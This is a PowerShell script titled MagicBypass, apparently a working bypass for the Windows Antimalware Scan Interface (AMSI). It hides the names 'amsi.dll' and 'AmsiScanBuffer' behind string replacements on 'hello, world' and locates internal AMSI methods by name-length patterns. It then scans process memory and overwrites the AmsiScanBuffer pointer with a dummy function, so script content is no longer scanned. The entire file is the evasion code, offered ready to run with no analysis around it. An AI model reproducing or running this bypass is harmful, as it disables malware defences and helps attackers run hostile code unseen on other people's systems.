function MagicBypass {

# Define named parameters
param(
    $InitialStart = 0x50000,
    $NegativeOffset= 0x50000,
    $MaxOffset = 0x1000000,
    $ReadBytes = 0x50000
)

$APIs = @"
using System;
using System.ComponentModel;
using System.Management.Automation;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Text;

public class APIs {
    [DllImport("kernel32.dll")]
    public static extern bool ReadProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, UInt32 nSize, ref UInt32 lpNumberOfBytesRead);

    [DllImport("kernel32.dll")]
    public static extern IntPtr GetCurrentProcess();

    [DllImport("kernel32", CharSet=CharSet.Ansi, ExactSpelling=true, SetLastError=true)]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
   
    [DllImport("kernel32.dll", CharSet=CharSet.Auto)]
    public static extern IntPtr GetModuleHandle([MarshalAs(UnmanagedType.LPWStr)] string lpModuleName);

    [MethodImpl(MethodImplOptions.NoOptimization | MethodImplOptions.NoInlining)]
    public static int Dummy() {
     return 1;
    }
}
"@

Add-Type $APIs

$InitialDate=Get-Date;

$string = 'hello, world'
$string = $string.replace('he','a')
$string = $string.replace('ll','m')
$string = $string.replace('o,','s')
$string = $string.replace(' ','i')
$string = $string.replace('wo','.d')
$string = $string.replace('rld','ll')

$string2 = 'hello, world'
$string2 = $string2.replace('he','A')
$string2 = $string2.replace('ll','m')
$string2 = $string2.replace('o,','s')
$string2 = $string2.replace(' ','i')
$string2 = $string2.replace('wo','Sc')
$string2 = $string2.replace('rld','an')

$string3 = 'hello, world'
$string3 = $string3.replace('hello','Bu')
$string3 = $string3.replace(', ','ff')
$string3 = $string3.replace('world','er')

$Address = [APIS]::GetModuleHandle($string)
[IntPtr] $funcAddr = [APIS]::GetProcAddress($Address, $string2 + $string3)

$Assemblies = [appdomain]::currentdomain.getassemblies()
$Assemblies |
  ForEach-Object {
    if($_.Location -ne $null){
     $split1 = $_.FullName.Split(",")[0]
     If($split1.StartsWith('S') -And $split1.EndsWith('n') -And $split1.Length -eq 28) {
       $Types = $_.GetTypes()
     }
    }
}

$Types |
  ForEach-Object {
    if($_.Name -ne $null){
     If($_.Name.StartsWith('A') -And $_.Name.EndsWith('s') -And $_.Name.Length -eq 9) {
       $Methods = $_.GetMethods([System.Reflection.BindingFlags]'Static,NonPublic')
     }
    }
}

$Methods |
  ForEach-Object {
    if($_.Name -ne $null){
     If($_.Name.StartsWith('S') -And $_.Name.EndsWith('t') -And $_.Name.Length -eq 11) {
       $MethodFound = $_
     }
    }
}

[IntPtr] $MethodPointer = $MethodFound.MethodHandle.GetFunctionPointer()
[IntPtr] $Handle = [APIs]::GetCurrentProcess()
$dummy = 0
$ApiReturn = $false
   
:initialloop for($j = $InitialStart; $j -lt $MaxOffset; $j += $NegativeOffset){
    [IntPtr] $MethodPointerToSearch = [Int64] $MethodPointer - $j
    $ReadedMemoryArray = [byte[]]::new($ReadBytes)
    $ApiReturn = [APIs]::ReadProcessMemory($Handle, $MethodPointerToSearch, $ReadedMemoryArray, $ReadBytes,[ref]$dummy)
    for ($i = 0; $i -lt $ReadedMemoryArray.Length; $i += 1) {
     $bytes = [byte[]]($ReadedMemoryArray[$i], $ReadedMemoryArray[$i + 1], $ReadedMemoryArray[$i + 2], $ReadedMemoryArray[$i + 3], $ReadedMemoryArray[$i + 4], $ReadedMemoryArray[$i + 5], $ReadedMemoryArray[$i + 6], $ReadedMemoryArray[$i + 7])
     [IntPtr] $PointerToCompare = [bitconverter]::ToInt64($bytes,0)
     if ($PointerToCompare -eq $funcAddr) {
       Write-Host "Found @ $($i)!"
       [IntPtr] $MemoryToPatch = [Int64] $MethodPointerToSearch + $i
       break initialloop
     }
    }
}
[IntPtr] $DummyPointer = [APIs].GetMethod('Dummy').MethodHandle.GetFunctionPointer()
$buf = [IntPtr[]] ($DummyPointer)
[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $MemoryToPatch, 1)

$FinishDate=Get-Date;
$TimeElapsed = ($FinishDate - $InitialDate).TotalSeconds;
Write-Host "$TimeElapsed seconds"
}
MagicBypass
